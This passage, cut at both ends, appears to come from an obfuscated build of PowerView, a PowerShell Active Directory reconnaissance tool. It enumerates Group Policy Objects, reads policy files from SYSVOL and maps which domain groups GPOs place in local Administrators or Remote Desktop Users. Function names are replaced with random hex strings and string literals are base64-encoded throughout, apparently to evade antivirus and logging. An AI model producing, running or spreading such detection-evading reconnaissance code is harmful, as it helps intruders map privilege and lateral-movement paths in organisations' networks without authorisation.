                                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABVAG4AYQBiAGwAZQAgAHQAbwAgAHIAZQB0AHIAaQBlAHYAZQAgAGQAbwBtAGEAaQBuACAAcwBlAGEAcgBjAGgAZQByACAAZgBvAHIAIAAnACQAewA3AGUAZQBmADAANQAxADcAYQBmAGUAOQA0ADUAOQA3AGEAZgA4AGEAYgA0AGIAZQAzADkAYQA3ADIANAA1ADEAfQAnAA==')))
                            }
                        }
                    }
                    elseif (${56aaa31f880a49e195bcf739ac331528} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAuACoAfQA=')))) {
                        ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABuAGEAbQBlAD0AJAB7ADUANgBhAGEAYQAzADEAZgA4ADgAMABhADQAOQBlADEAOQA1AGIAYwBmADcAMwA5AGEAYwAzADMAMQA1ADIAOAB9ACkA')))
                    }
                    else {
                        try {
                            ${a58a88389bba4f499974f2986992284e} = (-Join (([Guid]${56aaa31f880a49e195bcf739ac331528}).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuAC4AKQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkADEA')))
                            ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AGEANQA4AGEAOAA4ADMAOAA5AGIAYgBhADQAZgA0ADkAOQA5ADcANABmADIAOQA4ADYAOQA5ADIAMgA4ADQAZQB9ACkA')))
                        }
                        catch {
                            ${fb29aaa2f9c140909efae41cb42f1bef} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwBwAGwAYQB5AG4AYQBtAGUAPQAkAHsANQA2AGEAYQBhADMAMQBmADgAOAAwAGEANAA5AGUAMQA5ADUAYgBjAGYANwAzADkAYQBjADMAMwAxADUAMgA4AH0AKQA=')))
                        }
                    }
                }
                if (${fb29aaa2f9c140909efae41cb42f1bef} -and (${fb29aaa2f9c140909efae41cb42f1bef}.Trim() -ne '') ) {
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBmAGIAMgA5AGEAYQBhADIAZgA5AGMAMQA0ADAAOQAwADkAZQBmAGEAZQA0ADEAYwBiADQAMgBmADEAYgBlAGYAfQApAA==')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABVAHMAaQBuAGcAIABhAGQAZABpAHQAaQBvAG4AYQBsACAATABEAEEAUAAgAGYAaQBsAHQAZQByADoAIAAkAEwARABBAFAARgBpAGwAdABlAHIA')))
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                }
                ${463eb6beb0eb476aa61989bb04f75042}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwAFAAbwBsAGkAYwB5AEMAbwBuAHQAYQBpAG4AZQByACkAJABGAGkAbAB0AGUAcgApAA==')))
                Write-Verbose "[Get-DomainGPO] filter string: $(${463eb6beb0eb476aa61989bb04f75042}.filter)"
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${c1d2f3b775df48dfbe092797965c6f30} = ${463eb6beb0eb476aa61989bb04f75042}.FindOne() }
                else { ${c1d2f3b775df48dfbe092797965c6f30} = ${463eb6beb0eb476aa61989bb04f75042}.FindAll() }
                ${c1d2f3b775df48dfbe092797965c6f30} | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                        ${49c8423a1c59432baa79afb15cafad6f} = $_
                        ${49c8423a1c59432baa79afb15cafad6f}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwAuAFIAYQB3AA=='))))
                    }
                    else {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] -and ($SearchBase -Match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBHAEMAOgAvAC8A'))))) {
                            ${49c8423a1c59432baa79afb15cafad6f} = ac8c47b8977f4b0f9b4bbd3cb21b1a28 -Properties $_.Properties
                            try {
                                ${97be4aa89c724d778c50577152e7ca6d} = ${49c8423a1c59432baa79afb15cafad6f}.distinguishedname
                                ${f83446a679494bc59f0a974f35bcdb75} = ${97be4aa89c724d778c50577152e7ca6d}.SubString(${97be4aa89c724d778c50577152e7ca6d}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                                ${19af58038922438892e06f1ae472fa1e} = "\\${f83446a679494bc59f0a974f35bcdb75}\SysVol\${f83446a679494bc59f0a974f35bcdb75}\Policies\$(${49c8423a1c59432baa79afb15cafad6f}.cn)"
                                ${49c8423a1c59432baa79afb15cafad6f} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwBwAGMAZgBpAGwAZQBzAHkAcwBwAGEAdABoAA=='))) ${19af58038922438892e06f1ae472fa1e}
                            }
                            catch {
                                Write-Verbose "[Get-DomainGPO] Error calculating gpcfilesyspath for: $(${49c8423a1c59432baa79afb15cafad6f}.distinguishedname)"
                            }
                        }
                        else {
                            ${49c8423a1c59432baa79afb15cafad6f} = ac8c47b8977f4b0f9b4bbd3cb21b1a28 -Properties $_.Properties
                        }
                        ${49c8423a1c59432baa79afb15cafad6f}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwA='))))
                    }
                    ${49c8423a1c59432baa79afb15cafad6f}
                }
                if (${c1d2f3b775df48dfbe092797965c6f30}) {
                    try { ${c1d2f3b775df48dfbe092797965c6f30}.dispose() }
                    catch {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABFAHIAcgBvAHIAIABkAGkAcwBwAG8AcwBpAG4AZwAgAG8AZgAgAHQAaABlACAAUgBlAHMAdQBsAHQAcwAgAG8AYgBqAGUAYwB0ADoAIAAkAF8A')))
                    }
                }
                ${463eb6beb0eb476aa61989bb04f75042}.dispose()
            }
        }
    }
}
function a9db526398874ca7a902327326f1bcab {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $Identity,
        [Switch]
        ${cc09c1f12e1d411c94e08ab90554f3fd},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${afd7d337a750465cb1eadfa1f8ae176d} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${361a580794ef4c89844cfea6747040fa} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${361a580794ef4c89844cfea6747040fa}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${361a580794ef4c89844cfea6747040fa}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${361a580794ef4c89844cfea6747040fa}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${39fbccb7c4694fd2bd98312e9e1b2d81} = [System.StringSplitOptions]::RemoveEmptyEntries
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        b86c55f8931f4479ba4635fb6773bb3f @afd7d337a750465cb1eadfa1f8ae176d | ForEach-Object {
            ${7240bb8515604fc2831b6be7eb8b5a35} = $_.displayname
            $GPOname = $_.name
            ${096f798288ee42bbabdfef84193da5b8} = $_.gpcfilesyspath
            ${0992b5578ab849719e32d086ada1e57d} =  @{ 'GptTmplPath' = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADAAOQA2AGYANwA5ADgAMgA4ADgAZQBlADQAMgBiAGIAYQBiAGQAZgBlAGYAOAA0ADEAOQAzAGQAYQA1AGIAOAB9AFwATQBBAEMASABJAE4ARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAE4AVABcAFMAZQBjAEUAZABpAHQAXABHAHAAdABUAG0AcABsAC4AaQBuAGYA'))) }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${0992b5578ab849719e32d086ada1e57d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            ${9e65eee661ad49919648a1dec372e0a7} = a172e43005cd4658bcc5801312e35ab1 @0992b5578ab849719e32d086ada1e57d
            if (${9e65eee661ad49919648a1dec372e0a7} -and (${9e65eee661ad49919648a1dec372e0a7}.psbase.Keys -contains $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwACAATQBlAG0AYgBlAHIAcwBoAGkAcAA='))))) {
                ${dbd67449cdc9446b9379635e3e7226c6} = @{}
                ForEach (${9adbe07e9e6946d78d3e1ac6dd36e287} in ${9e65eee661ad49919648a1dec372e0a7}.'Group Membership'.GetEnumerator()) {
                    ${d9df5fc678774e82bffed7271d02d4ca}, $Relation = ${9adbe07e9e6946d78d3e1ac6dd36e287}.Key.Split('__', ${39fbccb7c4694fd2bd98312e9e1b2d81}) | ForEach-Object {$_.Trim()}
                    ${6288e1be5c2047c6a7b5e6c07763e110} = ${9adbe07e9e6946d78d3e1ac6dd36e287}.Value | Where-Object {$_} | ForEach-Object { $_.Trim('*') } | Where-Object {$_}
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBNAGUAbQBiAGUAcgBzAFQAbwBTAEkARABzAA==')))]) {
                        ${5a7d8559693744cdbcf828a11c9f1970} = @()
                        ForEach (${20ebd067c548454fa60a45c352c7aeb5} in ${6288e1be5c2047c6a7b5e6c07763e110}) {
                            if (${20ebd067c548454fa60a45c352c7aeb5} -and (${20ebd067c548454fa60a45c352c7aeb5}.Trim() -ne '')) {
                                if (${20ebd067c548454fa60a45c352c7aeb5} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAC4AKgA=')))) {
                                    ${910e0198dee648c68e0e62d39f1e91ab} = @{'ObjectName' = ${20ebd067c548454fa60a45c352c7aeb5}}
                                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${910e0198dee648c68e0e62d39f1e91ab}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
                                    ${52172c4c574547dfbd2909f13db04aa8} = dc5909cabc884d258719b96ec7cf3c2b @910e0198dee648c68e0e62d39f1e91ab
                                    if (${52172c4c574547dfbd2909f13db04aa8}) {
                                        ${5a7d8559693744cdbcf828a11c9f1970} += ${52172c4c574547dfbd2909f13db04aa8}
                                    }
                                    else {
                                        ${5a7d8559693744cdbcf828a11c9f1970} += ${20ebd067c548454fa60a45c352c7aeb5}
                                    }
                                }
                                else {
                                    ${5a7d8559693744cdbcf828a11c9f1970} += ${20ebd067c548454fa60a45c352c7aeb5}
                                }
                            }
                        }
                        ${6288e1be5c2047c6a7b5e6c07763e110} = ${5a7d8559693744cdbcf828a11c9f1970}
                    }
                    if (-not ${dbd67449cdc9446b9379635e3e7226c6}[${d9df5fc678774e82bffed7271d02d4ca}]) {
                        ${dbd67449cdc9446b9379635e3e7226c6}[${d9df5fc678774e82bffed7271d02d4ca}] = @{}
                    }
                    if (${6288e1be5c2047c6a7b5e6c07763e110} -isnot [System.Array]) {${6288e1be5c2047c6a7b5e6c07763e110} = @(${6288e1be5c2047c6a7b5e6c07763e110})}
                    ${dbd67449cdc9446b9379635e3e7226c6}[${d9df5fc678774e82bffed7271d02d4ca}].Add($Relation, ${6288e1be5c2047c6a7b5e6c07763e110})
                }
                ForEach (${9adbe07e9e6946d78d3e1ac6dd36e287} in ${dbd67449cdc9446b9379635e3e7226c6}.GetEnumerator()) {
                    if (${9adbe07e9e6946d78d3e1ac6dd36e287} -and ${9adbe07e9e6946d78d3e1ac6dd36e287}.Key -and (${9adbe07e9e6946d78d3e1ac6dd36e287}.Key -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBcACoA'))))) {
                        ${2d7c476caf164b22affc257b54255fe1} = ${9adbe07e9e6946d78d3e1ac6dd36e287}.Key.Trim('*')
                        if (${2d7c476caf164b22affc257b54255fe1} -and (${2d7c476caf164b22affc257b54255fe1}.Trim() -ne '')) {
                            ${14eb3c56654d4851b0c0e59e10d33e62} = e867aff561cb4dacb74c955fc46aa9c1 -23ca6558fa4b4ce695fc6d89d0b892e5 ${2d7c476caf164b22affc257b54255fe1} @361a580794ef4c89844cfea6747040fa
                        }
                        else {
                            ${14eb3c56654d4851b0c0e59e10d33e62} = $False
                        }
                    }
                    else {
                        ${14eb3c56654d4851b0c0e59e10d33e62} = ${9adbe07e9e6946d78d3e1ac6dd36e287}.Key
                        if (${14eb3c56654d4851b0c0e59e10d33e62} -and (${14eb3c56654d4851b0c0e59e10d33e62}.Trim() -ne '')) {
                            if (${14eb3c56654d4851b0c0e59e10d33e62} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzAA==')))) {
                                ${2d7c476caf164b22affc257b54255fe1} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))
                            }
                            elseif (${14eb3c56654d4851b0c0e59e10d33e62} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAIABEAGUAcwBrAHQAbwBwAA==')))) {
                                ${2d7c476caf164b22affc257b54255fe1} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))
                            }
                            elseif (${14eb3c56654d4851b0c0e59e10d33e62} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwB1AGUAcwB0AHMA')))) {
                                ${2d7c476caf164b22affc257b54255fe1} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADYA')))
                            }
                            elseif (${14eb3c56654d4851b0c0e59e10d33e62}.Trim() -ne '') {
                                ${910e0198dee648c68e0e62d39f1e91ab} = @{'ObjectName' = ${14eb3c56654d4851b0c0e59e10d33e62}}
                                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${910e0198dee648c68e0e62d39f1e91ab}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
                                ${2d7c476caf164b22affc257b54255fe1} = dc5909cabc884d258719b96ec7cf3c2b @910e0198dee648c68e0e62d39f1e91ab
                            }
                            else {
                                ${2d7c476caf164b22affc257b54255fe1} = $Null
                            }
                        }
                    }
                    ${51bfe0eb07c040518024bb4ab78efb12} = New-Object PSObject
                    ${51bfe0eb07c040518024bb4ab78efb12} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) ${7240bb8515604fc2831b6be7eb8b5a35}
                    ${51bfe0eb07c040518024bb4ab78efb12} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ATgBhAG0AZQA='))) $GPOName
                    ${51bfe0eb07c040518024bb4ab78efb12} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AUABhAHQAaAA='))) ${096f798288ee42bbabdfef84193da5b8}
                    ${51bfe0eb07c040518024bb4ab78efb12} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdAByAGkAYwB0AGUAZABHAHIAbwB1AHAAcwA=')))
                    ${51bfe0eb07c040518024bb4ab78efb12} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAdABlAHIAcwA='))) $Null
                    ${51bfe0eb07c040518024bb4ab78efb12} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${14eb3c56654d4851b0c0e59e10d33e62}
                    ${51bfe0eb07c040518024bb4ab78efb12} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFMASQBEAA=='))) ${2d7c476caf164b22affc257b54255fe1}
                    ${51bfe0eb07c040518024bb4ab78efb12} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE0AZQBtAGIAZQByAE8AZgA='))) ${9adbe07e9e6946d78d3e1ac6dd36e287}.Value.Memberof
                    ${51bfe0eb07c040518024bb4ab78efb12} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE0AZQBtAGIAZQByAHMA'))) ${9adbe07e9e6946d78d3e1ac6dd36e287}.Value.Members
                    ${51bfe0eb07c040518024bb4ab78efb12}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBHAHIAbwB1AHAA'))))
                    ${51bfe0eb07c040518024bb4ab78efb12}
                }
            }
            ${0992b5578ab849719e32d086ada1e57d} =  @{
                'GroupsXMLpath' = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7ADAAOQA2AGYANwA5ADgAMgA4ADgAZQBlADQAMgBiAGIAYQBiAGQAZgBlAGYAOAA0ADEAOQAzAGQAYQA1AGIAOAB9AFwATQBBAEMASABJAE4ARQBcAFAAcgBlAGYAZQByAGUAbgBjAGUAcwBcAEcAcgBvAHUAcABzAFwARwByAG8AdQBwAHMALgB4AG0AbAA=')))
            }
            a4d6c5a47cb34390bc3b7adaffdbff05 @0992b5578ab849719e32d086ada1e57d | ForEach-Object {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBNAGUAbQBiAGUAcgBzAFQAbwBTAEkARABzAA==')))]) {
                    ${5a7d8559693744cdbcf828a11c9f1970} = @()
                    ForEach (${20ebd067c548454fa60a45c352c7aeb5} in $_.GroupMembers) {
                        if (${20ebd067c548454fa60a45c352c7aeb5} -and (${20ebd067c548454fa60a45c352c7aeb5}.Trim() -ne '')) {
                            if (${20ebd067c548454fa60a45c352c7aeb5} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAC4AKgA=')))) {
                                ${910e0198dee648c68e0e62d39f1e91ab} = @{'ObjectName' = ${14eb3c56654d4851b0c0e59e10d33e62}}
                                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${910e0198dee648c68e0e62d39f1e91ab}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
                                ${52172c4c574547dfbd2909f13db04aa8} = dc5909cabc884d258719b96ec7cf3c2b -Domain $Domain -d43566a07dda43778aacb7392fc974f0 ${20ebd067c548454fa60a45c352c7aeb5}
                                if (${52172c4c574547dfbd2909f13db04aa8}) {
                                    ${5a7d8559693744cdbcf828a11c9f1970} += ${52172c4c574547dfbd2909f13db04aa8}
                                }
                                else {
                                    ${5a7d8559693744cdbcf828a11c9f1970} += ${20ebd067c548454fa60a45c352c7aeb5}
                                }
                            }
                            else {
                                ${5a7d8559693744cdbcf828a11c9f1970} += ${20ebd067c548454fa60a45c352c7aeb5}
                            }
                        }
                    }
                    $_.GroupMembers = ${5a7d8559693744cdbcf828a11c9f1970}
                }
                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) ${7240bb8515604fc2831b6be7eb8b5a35}
                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8ATgBhAG0AZQA='))) $GPOName
                $_ | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFAAbwBsAGkAYwB5AFAAcgBlAGYAZQByAGUAbgBjAGUAcwA=')))
                $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBHAHIAbwB1AHAA'))))
                $_
            }
        }
    }
}
function Get-DomainGPOUserLocalGroupMapping {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOUserLocalGroupMapping')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $Identity,
        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $LocalGroup = 'Administrators',
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${4d9045c4da1f4e51877c33724d2fe187} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${4d9045c4da1f4e51877c33724d2fe187}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${4d9045c4da1f4e51877c33724d2fe187}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${4d9045c4da1f4e51877c33724d2fe187}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
